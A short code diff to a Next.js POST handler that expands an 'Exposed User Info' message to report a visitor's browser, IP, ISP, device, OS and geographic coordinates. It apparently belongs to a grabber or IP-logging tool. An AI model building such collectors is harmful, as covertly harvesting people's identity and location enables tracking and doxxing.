@@ -21,9 +21,16 @@ export async function POST(request: NextRequest) {
     const details = {
       content: `
 **Exposed User Info**
-- Browser: ${req.browser}
-- IP: ${req.ip}
-- Coordinates: ${JSON.stringify(req.coordinates)}
+- Browser: ${req.browser || "Unknown"}
+- IP: ${req.ip || "Unknown"}
+- ISP: ${req.isp || "ISP information unavailable"}
+- Device: ${req.device || "Unknown"}
+- OS: ${req.os || "Unknown"}
+${
+  req.coordinates
+    ? `- Coordinates: ${req.coordinates.latitude}, ${req.coordinates.longitude}`
+    : "- Coordinates: Not available"
+}
       `,
     };
 
